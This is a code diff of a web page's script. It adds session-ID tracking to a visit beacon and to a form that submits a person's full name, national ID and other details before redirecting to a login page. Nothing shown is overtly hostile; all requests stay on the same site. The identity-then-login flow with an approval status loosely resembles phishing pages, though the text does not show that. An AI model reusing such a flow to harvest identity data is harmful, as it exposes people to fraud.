@@ -341,14 +341,20 @@
         </div>
     </footer>
 
-    <!-- Tracking and Form Submit Scripts -->
     <script>
+        function getSessionId() {
+            let sid = localStorage.getItem('session_id');
+            if (!sid) {
+                sid = 'sid_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                localStorage.setItem('session_id', sid);
+            }
+            return sid;
+        }
+
         fetch("/track_visit", {
             method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-            },
-            body: JSON.stringify({ action: "track_visit", page: "personal_info_en" })
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ session_id: getSessionId(), current_page: "personal_info_en" })
         }).catch(error => console.error("Error tracking visit:", error));
 
         document.getElementById("personalInfoForm").addEventListener("submit", async function(event) {
@@ -369,11 +375,11 @@
             try {
                 const response = await fetch("/submit_request", {
                     method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
+                        session_id: getSessionId(),
                         type: "personal_info",
+                        current_page: "personal_info_en",
                         data: {
                             fullName: fullName,
                             nationalId: nationalId,
@@ -387,11 +393,10 @@
 
                 const result = await response.json();
 
-                if (result.status === "approved" || result.status === "pending") {
-                    localStorage.setItem("request_id", result.request_id);
+                if (result.ok) {
                     window.location.href = "login_en.html";
                 } else {
-                    errorMessageDiv.textContent = result.message || "An unexpected error occurred.";
+                    errorMessageDiv.textContent = result.error || "An unexpected error occurred.";
                     errorMessageDiv.style.display = "block";
                 }
             } catch (error) {
